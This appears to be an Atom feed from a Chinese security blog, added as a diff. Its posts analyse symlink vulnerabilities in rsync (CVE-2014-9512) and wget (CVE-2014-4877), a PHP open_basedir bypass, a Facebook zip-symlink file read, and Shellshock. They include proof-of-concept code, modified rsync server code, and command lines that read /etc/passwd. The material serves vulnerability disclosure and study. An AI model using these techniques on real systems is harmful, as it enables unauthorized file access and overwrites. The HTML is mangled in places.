+<p>2:Rsync path spoofing  attack  vulnerability(CVE-2014-9512  )<br>笔者分析wget漏洞之后,发现rsync递归同步文件时,同样可以用符号链接来<br>欺骗路径,由于rsync双向文件处理算法比较复杂,无法直接用字符串伪造文件流。<br>首先rsync共享文件夹新建symbolic link 指向/root/:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@pentest rsync]<span class="meta"># ls  -lh</span></span><br><span class="line">total <span class="number">8.0</span>K</span><br><span class="line">-rw-r--r-- <span class="number">1</span> root root    <span class="number">2</span> Oct <span class="number">31</span> <span class="number">03</span>:<span class="number">16</span> <span class="number">1.</span>txt</span><br><span class="line">lrwxrwxrwx <span class="number">1</span> root root    <span class="number">6</span> Oct <span class="number">31</span> <span class="number">05</span>:<span class="number">09</span> fakedir -&gt; /root/</span><br><span class="line">drwxr-xr-x <span class="number">2</span> root root <span class="number">4.0</span>K Oct <span class="number">31</span> <span class="number">05</span>:<span class="number">08</span> truedir</span><br></pre></td></tr></table></figure></p>
+<p>truedir 中写入测试文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@pentest rsync]# cd  truedir/</span><br><span class="line">[root@pentest truedir]# ls</span><br><span class="line">[root@pentest truedir]# echo rsync  test  &gt;  pwned</span><br><span class="line">[root@pentest truedir]# ls -lh</span><br><span class="line">total 4.0K</span><br><span class="line">-rw-r--r-- 1 root root 11 Oct 31 05:17 pwned</span><br><span class="line">[root@pentest truedir]#</span><br></pre></td></tr></table></figure></p>
+<p>再修改服务端发送文件列表的代码<br>file: rsync-3.1.1/flist.c    line:394<br>[code lnag=”c”]<br>static void send_file_entry(int f, const char <em>fname, struct file_struct </em>file,</p>
+<p>#ifdef SUPPORT_LINKS<br>                const char *symlink_name, int symlink_len,</p>
+<p>#endif<br>                int ndx, int first_ndx)<br>{<br>  if(strcmp(fname,”turedir/pwned”) == 0){</p>
+<pre><code>fname=&quot;fakedir/pwned&quot;;  // symbolic link 
+</code></pre><p>//change  file  true path(truedir) to  symbolic link  (fakedir)<br>)<br>}<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">由于服务端有严格的数据校验,此时会报错 &quot;received request to transfer</span><br><span class="line">non-regular file fakedir/pwned.test 7 [sender]&quot;,导致客户端同步无法执行</span><br><span class="line">但是对于攻击者来说,服务端是可控的,找到对应代码直接注释。</span><br><span class="line">``` c</span><br><span class="line">/* if (iflags &amp;amp; ITEM_TRANSFER) &#123;</span><br><span class="line">		int i = ndx - cur_flist-&gt;ndx_start;</span><br><span class="line">		if (i &lt; 0 || !S_ISREG(cur_flist-&gt;files[i]-&gt;mode)) &#123;</span><br><span class="line">			rprintf(FERROR,</span><br><span class="line">				&quot;received request to transfer non-regular file: %d [%s]\n&quot;,</span><br><span class="line">				ndx, who_am_i());</span><br><span class="line">			exit_cleanup(RERR_PROTOCOL);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">*/</span><br></pre></td></tr></table></figure></p>
+<p>漏洞演示:<br>server(attacker):<br><a href="/uploads/2015/01/attack.png"><img src="/uploads/2015/01/attack-300x82.png" alt="" title="attack"></a><br>client(victim):<br><a href="/uploads/2015/01/victim1.jpg"><img src="/uploads/2015/01/victim1-300x229.jpg" alt="" title="victim"></a></p>
+<h3 id="0×02-web-程序"><a href="#0×02-web-程序" class="headerlink" title="0×02 web 程序"></a>0×02 web 程序</h3><pre><code>当通过http访问文件时,web  server 对符号链接处理不当可能导致越权访问,文件
+</code></pre><p>读取等安全隐患。<br>案例:<br>1:php  通用绕过 open_basedir 读取任意文件<br>使用函数symlink 与 mkdir 创建一个指向目标的符号链接,代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mkdir(<span class="string">"abc"</span>);</span><br><span class="line">chdir(<span class="string">"abc"</span>);</span><br><span class="line">mkdir(<span class="string">"etc"</span>);</span><br><span class="line">chdir(<span class="string">"etc"</span>);</span><br><span class="line">mkdir(<span class="string">"passwd"</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">mkdir(<span class="string">"abc"</span>);</span><br><span class="line">chdir(<span class="string">"abc"</span>);</span><br><span class="line">mkdir(<span class="string">"abc"</span>);</span><br><span class="line">chdir(<span class="string">"abc"</span>);</span><br><span class="line">mkdir(<span class="string">"abc"</span>);</span><br><span class="line">chdir(<span class="string">"abc"</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">chdir(<span class="string">".."</span>);</span><br><span class="line">symlink(<span class="string">"abc/abc/abc/abc"</span>,<span class="string">"tmplink"</span>);</span><br><span class="line">symlink(<span class="string">"tmplink/../../../etc/passwd"</span>, <span class="string">"exploit"</span>);</span><br><span class="line">unlink(<span class="string">"tmplink"</span>);  <span class="comment">//删除</span></span><br><span class="line">mkdir(<span class="string">"tmplink"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>生成文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x 4 www www 512 Oct 20 00:37 abc</span><br><span class="line">lrwxr-xr-x 1 www www 27 Oct 20 00:37 exploit -&gt; tmplink/../../../etc/passwd</span><br><span class="line">- -rw-r--r-- 1 www www 356 Oct 20 00:32 kakao.php</span><br><span class="line">- -rw-r--r-- 1 www www 45 Oct 20 00:26 sym.php</span><br><span class="line">drwxr-xr-x 2 www www 512 Oct 20 00:37 tmplink</span><br></pre></td></tr></table></figure></p>
+<p>exploit 已经指向/etc/passwd,通过web server 如Apache 直接静态访问,可以绕过php  open_basedir<br>保护读取文件。</p>
+<p>2:facebook  本地文件读取<br> 当服务端会自动解压zip,tar 等支持符号链接的压缩格式时。可以通过符号链接读取服务器文件<br>例如facebook  本地文件读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.创建一个符号链接文件指向/etc/passwd </span><br><span class="line">ln -s /etc/passwd link </span><br><span class="line">2\. 压缩文件，同时保留链接 </span><br><span class="line">zip --symlinks test.zip link </span><br><span class="line">3.上传test.zip文件，系统会自动解压缩 </span><br><span class="line">4\. 页面当中会返回/etc/passwd的内容</span><br></pre></td></tr></table></figure></p>
+<p>如图<br><a href="/uploads/2015/01/Facebook.png"><img src="/uploads/2015/01/Facebook-300x144.png" alt="" title="Facebook"></a></p>
+<h3 id="0×03-参考链接"><a href="#0×03-参考链接" class="headerlink" title="0×03 参考链接"></a>0×03 参考链接</h3><p>1:CVE-2014-4877 wget ftp下载文件夹链接欺骗漏洞分析   <a href="http://xteam.baidu.com/?p=30" title="http://xteam.baidu.com/?p=30" target="_blank" rel="external">http://xteam.baidu.com/?p=30</a><br>2:Rsync path spoofing  attack  vulnerability    <a href="http://xteam.baidu.com/?p=169" title="http://xteam.baidu.com/?p=169" target="_blank" rel="external">http://xteam.baidu.com/?p=169</a><br>3:Php open_basedir bypass  <a href="http://cxsecurity.com/issue/WLB-2009110068" title="http://cxsecurity.com/issue/WLB-2009110068" target="_blank" rel="external">http://cxsecurity.com/issue/WLB-2009110068</a><br>4:Reading local files from Facebook’s server  <a href="http://josipfranjkovic.blogspot.com/2014/12/reading-local-files-from-facebooks.html" title="http://josipfranjkovic.blogspot.com/2014/12/reading-local-files-from-facebooks.html" target="_blank" rel="external">http://josipfranjkovic.blogspot.com/2014/12/reading-local-files-from-facebooks.html</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0×00-前言&quot;&gt;&lt;a href=&quot;#0×00-前言&quot; class=&quot;headerlink&quot; title=&quot;0×00  前言&quot;&gt;&lt;/a&gt;0×00  前言&lt;/h3&gt;&lt;p&gt;Linux作为应用最广泛的开源系统，其中独特的文件系统可以算是支撑Linux强大功能的核心组件之一，而&lt;br&gt;在文件系统中，符号链接(symbolic link )形如”月光宝盒”般可以穿梭时空，自由穿越森严的路径限制，此一&lt;br&gt;特性，使其地位在整个Linux系统中占有重要一席，本文将通过实际分析与研究，深入探讨因对符号链接处理&lt;br&gt;不当，可能造成的各类安全问题，以引发对此类问题的重视。&lt;br&gt;
+    
+    </summary>
+    
+      <category term="技术文章" scheme="yaseng.org/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="CVE-2014-4877" scheme="yaseng.org/tags/CVE-2014-4877/"/>
+    
+      <category term="CVE-2014-9512" scheme="yaseng.org/tags/CVE-2014-9512/"/>
+    
+      <category term="symbolic link attack" scheme="yaseng.org/tags/symbolic-link-attack/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Rsync path spoofing attack vulnerability (CVE-2014-9512)</title>
+    <link href="yaseng.org/rsync-path-spoofing-attack-vulnerability.html"/>
+    <id>yaseng.org/rsync-path-spoofing-attack-vulnerability.html</id>
+    <published>2015-01-19T21:49:20.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p><table></table></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">Vulnerable App</td></p>
+<p><td valign="top" width="435">Rsync</td><br></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">Author</td></p>
+<p><td valign="top" width="435">Yaseng</td><br></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">Team</td></p>
+<p><td valign="top" width="435">Baidu X-team</td><br></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">CVE</td></p>
+<p><td valign="top" width="435"> CVE-2014-9512</td><br><br><br><br>     In newest version rsync(3.1.1),directly modify the file path into absolute path is<br>not hijack succeed due to the security checks,but using symbolic links still can bypass<br>security checks and spoofing client.When a client uses parameter -a to synchronize<br>files of the server-side(default),for example:<br><figure class="highlight plain"><figcaption><span>-avzP  127.0.0.1::share</span><a href="/tmp/share">```</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Rsync recursive synchronous all files,An attacker can hijack the file path  by modifying</span><br><span class="line">the code of the server-side,allows remote  servers to write to arbitrary files, and </span><br><span class="line">consequently execute arbitrary code .</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line">### Vulnerability  Details </span><br><span class="line"></span><br><span class="line">    Firstly,i write a following file into the shared folder in rsync:a true folder</span><br><span class="line"> and a symbolic link are directed to the root directory .</span><br></pre></td></tr></table></figure></p>
+<p>[root@pentest rsync]# ls  -lh<br>total 8.0K<br>-rw-r–r– 1 root root    2 Oct 31 03:16 1.txt<br>lrwxrwxrwx 1 root root    6 Oct 31 05:09 fakedir -&gt; /root/<br>drwxr-xr-x 2 root root 4.0K Oct 31 05:08 truedir<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Then enter the truedir folder, create a new file  name &quot;pwned&quot;.</span><br></pre></td></tr></table></figure></p>
+<p>[root@pentest rsync]# cd  truedir/<br>[root@pentest truedir]# ls<br>[root@pentest truedir]# echo rsync  test  &gt;  pwned<br>[root@pentest truedir]# ls -lh<br>total 4.0K<br>-rw-r–r– 1 root root 11 Oct 31 05:17 pwned<br>[root@pentest truedir]#<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Next I modify the server to send the file code,in the process of synchronizing,the path</span><br><span class="line">of file &quot;pwned&quot; can be blocked and changed into any path.For example as follow code,change</span><br><span class="line">true path  (truedir) to symbolic link (fakedir),this would put the Pwned file to download</span><br><span class="line">to the symbolic link  points to the address (fakedir -&gt; /root/).</span><br><span class="line">file: flist.c    line:394</span><br><span class="line">``` c</span><br><span class="line">static void send_file_entry(int f, const char *fname, struct file_struct *file,</span><br><span class="line">#ifdef SUPPORT_LINKS</span><br><span class="line">			    const char *symlink_name, int symlink_len,</span><br><span class="line">#endif</span><br><span class="line">			    int ndx, int first_ndx)</span><br><span class="line">&#123;</span><br><span class="line">  if(strcmp(fname,&quot;turedir/pwned&quot;) == 0)&#123;</span><br><span class="line"></span><br><span class="line">  	fname=&quot;fakedir/pwned&quot;;  // symbolic link </span><br><span class="line">//change  file  true path(truedir) to  symbolic link  (fakedir)</span><br><span class="line">)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Then, verification occurs in the server-side and says “received request to transfer<br>non-regular file fakedir/pwned.test 7 [sender]”, But as an attacker, the code of the<br>server-side can be arbitrarily controlled,Shielding the following code.<br>file:rsync.c    line:405<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* if (iflags &amp;amp; ITEM_TRANSFER) &#123;</span><br><span class="line">		int i = ndx - cur_flist-&gt;ndx_start;</span><br><span class="line">		if (i &lt; 0 || !S_ISREG(cur_flist-&gt;files[i]-&gt;mode)) &#123;</span><br><span class="line">			rprintf(FERROR,</span><br><span class="line">				"received request to transfer non-regular file: %d [%s]\n",</span><br><span class="line">				ndx, who_am_i());</span><br><span class="line">			exit_cleanup(RERR_PROTOCOL);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">*/</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="Vulnerability-Demo"><a href="#Vulnerability-Demo" class="headerlink" title="Vulnerability  Demo"></a>Vulnerability  Demo</h3><p>server-side(attacker):<br><a href="/uploads/2015/01/attack.png"><img src="/uploads/2015/01/attack-300x82.png" alt="" title="attack"></a></p>
+<p>client-side(victim):<br><a href="/uploads/2015/01/victim1.jpg"><img src="/uploads/2015/01/victim1-300x229.jpg" alt="" title="victim"></a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;Summary&quot;&gt;&lt;a href=&quot;#Summary&quot; class=&quot;headerlink&quot; title=&quot;Summary&quot;&gt;&lt;/a&gt;Summary&lt;/h3&gt;&lt;p&gt;&lt;table&gt;&lt;/table&gt;&lt;/p&gt;
+&lt;p&gt;&lt;tbody&gt;&lt;/tbody&gt;&lt;/p&gt;
+&lt;p&gt;&lt;tr&gt;
+    
+    </summary>
+    
+      <category term="Yaseng" scheme="yaseng.org/categories/Yaseng/"/>
+    
+      <category term="原创作品" scheme="yaseng.org/categories/Yaseng/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+    
+      <category term="CVE-2014-9512" scheme="yaseng.org/tags/CVE-2014-9512/"/>
+    
+      <category term="Rsync" scheme="yaseng.org/tags/Rsync/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>CVE-2014-4877 wget ftp下载文件夹链接欺骗漏洞分析</title>
+    <link href="yaseng.org/cve-2014-4877-wget-ftp-fake-attack-vulnerability.html"/>
+    <id>yaseng.org/cve-2014-4877-wget-ftp-fake-attack-vulnerability.html</id>
+    <published>2014-11-25T07:34:57.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><p><table></table></p>
+<p><tbody></tbody></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">应用名称</td></p>
+<p><td valign="top" width="435"><span style="font-family: 宋体;">Wget</span></td><br></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">影响版本</td></p>
+<p><td valign="top" width="435"><span style="font-family: 宋体;">Wget &lt; 1.16</span></td><br></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">发布时间</td></p>
+<p><td valign="top" width="435"><span style="font-family: 宋体;">2014-10-28</span></td><br></p>
+<p><tr></tr></p>
+<p><td valign="top" width="132">相关编号</td></p>
+<p><td valign="top" width="435"><span style="font-family: 宋体;">CVE-2014-4877</span></td><br><br><br><br><a id="more"></a></p>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>  wget ftp下载符号链接文件时(没开启retr-symlinks 选项),会在本身系统创建一个符号链接,当伪造<br>一个ftp 数据包中有的文件夹符号链接和一个同名文件夹并且真实文件夹中有子文件时,wget递归下载<br>时会把子文件下载到本地文件夹符号链接指向的地址。攻击者通过伪造ftp数据流可在目标任意目录中<br>创建文件、文件夹、连接符号,甚至设置权限、时间等属性。<br>    当wget ftp客户端发送 LIST 指令时,返回如下数据:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lrwxrwxrwx   1 root     root           33 Oct 11  2013 fakedir -&gt; /tmp</span><br><span class="line">drwxrwxr-x  15 root     root         4096 Oct 11  2013 fakedir</span><br></pre></td></tr></table></figure></p>
+<p>文件 wget-1.12\src\ftp.c 文件   1761 行<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!opt.retr_symlinks) <span class="comment">//判断是否开启retr-symlinks 选项</span></span><br><span class="line">            &#123;</span><br><span class="line">            ...</span><br><span class="line">            &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_SYMLINK</span></span><br><span class="line">              <span class="keyword">if</span> (!f-&gt;linkto)</span><br><span class="line">                logputs (LOG_NOTQUIET,</span><br><span class="line">                         _(<span class="string">"Invalid name of the symlink, skipping.\n"</span>));</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                .......</span><br><span class="line">            <span class="keyword">if</span> (symlink (f-&gt;linkto, con-&gt;target) == <span class="number">-1</span>) <span class="comment">// 本地建立文件符号链接</span></span><br><span class="line">                    logprintf (LOG_NOTQUIET, <span class="string">"symlink: %s\n"</span>, strerror (errno));</span><br><span class="line">                  logputs (LOG_VERBOSE, <span class="string">"\n"</span>);</span><br><span class="line">                &#125; <span class="comment">/* have f-&gt;linkto */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span>  <span class="comment">/* not HAVE_SYMLINK */</span></span></span><br></pre></td></tr></table></figure></p>
+<p>如上代码,wget 会通过symlink 在本地创建链接文件,指向数据包中链接的地址。当使用 -m/–mirror/-r<br>选项时,递归去获取同名文件夹 fakedir 里面的文件,由于本地的fakedir 文件为符号链接,所以ftp 服务器<br>中的同名fakedir 文件夹子层下面的都会被下载到链接文件指向的地址。<br>   wget 发送cwd 指令进入fakedir 在发送 LIST 指令。此时可以伪造一个恶意文件或者目录比如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwx------ 1 root root 21 Aug 29 2013 pwned</span><br></pre></td></tr></table></figure></p>
+<p>wget  RETR 指令下载pwned 文件,返回文件内容(二进制或者文本)即可。如以下Python代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f = open(&quot;1.txt&quot;, &quot;r&quot;)</span><br><span class="line">data = f.read(8192)</span><br><span class="line">f.close()</span><br><span class="line">self.data_fd.send(data)</span><br><span class="line">self.data_fd.close()</span><br><span class="line">self.data_fd = 0</span><br><span class="line">self.message(226, &quot;ok&quot;)</span><br></pre></td></tr></table></figure></p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>1:Metasploit  wget_symlink_file_write 模块<br><a href="https://github.com/hmoore-r7/metasploit-framework/blob/R7-2014-15-wget/modules/auxiliary/server/wget_symlink_file_write.rb" title="https://github.com/hmoore-r7/metasploit-framework/blob/R7-2014-15-wget/modules/auxiliary/server/wget_symlink_file_write.rb" target="_blank" rel="external">https://github.com/hmoore-r7/metasploit-framework/blob/R7-2014-15-wget/modules/auxiliary/server/wget_symlink_file_write.rb</a></p>
+<p>2:Python  socket 版 wget-symlink_attack_exploit.py<br><a href="https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink_attack_exploit.py" title="https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink_attack_exploit.py" target="_blank" rel="external">https://github.com/yaseng/pentest/blob/master/exploit/wget-symlink_attack_exploit.py</a></p>
+<h4 id="漏洞演示"><a href="#漏洞演示" class="headerlink" title="漏洞演示"></a>漏洞演示</h4><p>运行 wget-symlink_attack_exploit.py<br>wget -m  ftp://127.0.0.1<br>效果如下图<br><a href="/uploads/2014/11/wget-1.jpg"><img src="/uploads/2014/11/wget-1-300x293.jpg" alt="" title="wget-1"></a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;基本信息&quot;&gt;&lt;a href=&quot;#基本信息&quot; class=&quot;headerlink&quot; title=&quot;基本信息&quot;&gt;&lt;/a&gt;基本信息&lt;/h3&gt;&lt;p&gt;&lt;table&gt;&lt;/p&gt;
+&lt;p&gt;&lt;tbody&gt;&lt;/p&gt;
+&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;132&quot;&gt;应用名称&lt;/td&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;435&quot;&gt;&lt;span style=&quot;font-family: 宋体;&quot;&gt;Wget&lt;/span&gt;&lt;/td&gt;&lt;br&gt;&lt;/tr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;132&quot;&gt;影响版本&lt;/td&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;435&quot;&gt;&lt;span style=&quot;font-family: 宋体;&quot;&gt;Wget &amp;lt; 1.16&lt;/span&gt;&lt;/td&gt;&lt;br&gt;&lt;/tr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;132&quot;&gt;发布时间&lt;/td&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;435&quot;&gt;&lt;span style=&quot;font-family: 宋体;&quot;&gt;2014-10-28&lt;/span&gt;&lt;/td&gt;&lt;br&gt;&lt;/tr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;tr&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;132&quot;&gt;相关编号&lt;/td&gt;&lt;/p&gt;
+&lt;p&gt;&lt;td valign=&quot;top&quot; width=&quot;435&quot;&gt;&lt;span style=&quot;font-family: 宋体;&quot;&gt;CVE-2014-4877&lt;/span&gt;&lt;/td&gt;&lt;br&gt;&lt;/tr&gt;&lt;br&gt;&lt;/tbody&gt;&lt;br&gt;&lt;/table&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="原创作品" scheme="yaseng.org/categories/%E5%8E%9F%E5%88%9B%E4%BD%9C%E5%93%81/"/>
+    
+    
+      <category term="CVE-2014-4877" scheme="yaseng.org/tags/CVE-2014-4877/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Bash Shellshock 漏洞简单说明</title>
+    <link href="yaseng.org/bash-shellshock.html"/>
+    <id>yaseng.org/bash-shellshock.html</id>
+    <published>2014-10-16T03:23:50.000Z</published>
+    <updated>2016-09-01T13:27:52.000Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>国庆之前分析了这个漏洞,看到有《安全参考》读者讨论,发一个简单Bash Shellshock 漏洞说明。</p>
+<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p> 漏洞原理通俗点说就是bash语言在定义一个函数时没有严格过滤导致代码执行,类似于php语言中的<br> <figure class="highlight plain"><figcaption><span>func1()&#123; return 1 &#125;; echo 2") ```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">程序在定义完函数func1时继续往下执行,最终导致echo 2 成功命令注入。</span><br><span class="line">&lt;!--more--&gt;</span><br><span class="line"></span><br><span class="line">### 利用范围</span><br><span class="line"></span><br><span class="line">漏洞利用需要两个条件</span><br><span class="line">第一 bash环境变量可控注入命令</span><br><span class="line">第二 有子进程启动来触发定义函数过程     </span><br><span class="line">几个利用的场景</span><br><span class="line"></span><br><span class="line">Apache cgi 使用bash 语言</span><br><span class="line">Apache cgi 使用Python ,perl等语言并自动子进程,例如Python代码os.system(&quot;id&quot;)</span><br><span class="line">Git/Svn/Rsync 等受命令的ssh环境,可以突破限制</span><br><span class="line">Dhcp 客户端</span><br><span class="line">某些stmp邮件服务器等适合以上两个条件</span><br><span class="line"></span><br><span class="line">### CVE-2014-7169 poc解释</span><br><span class="line"></span><br><span class="line">```env X=‘() &#123;:;&#125;; echo vulnerable’  bash –c &quot;echo this is a test&quot;</span><br></pre></td></tr></table></figure></p>
+<p>env  命令是设置环境变量X并且执行后面的语句,开启bash子进程触发漏洞,<br>(){}为匿名函数,中间的:;中的冒号相当于nop,函数体没有换行是必须有分<br>号,:;是bash函数体的最小元素。</p>
+<h3 id="CVE-2014-7169绕过"><a href="#CVE-2014-7169绕过" class="headerlink" title="CVE-2014-7169绕过"></a>CVE-2014-7169绕过</h3><p>官方补丁之后有人发布了一个绕过poc<br><code>env X=&#39;() { (a)=&gt;\&#39; bash -c &quot;echo date&quot;</code></p>
+<p>绕过原理具体可见知道创宇的分析,这个poc不能在Apache cgi这样环境下的远程代码执行,<br>只能来本地突破沙盒。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;国庆之前分析了这个漏洞,看到有《安全参考》读者讨论,发一个简单Bash Shellshock 漏洞说明。&lt;/p&gt;
+&lt;h3 id=&quot;漏洞概述&quot;
+    
+    </summary>
+    
+      <category term="Hack" scheme="yaseng.org/categories/Hack/"/>
+    
+      <category term="技术文章" scheme="yaseng.org/categories/Hack/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
+    
+    
+      <category term="Shellshock" scheme="yaseng.org/tags/Shellshock/"/>
+    
+  </entry>
+  
+</feed>
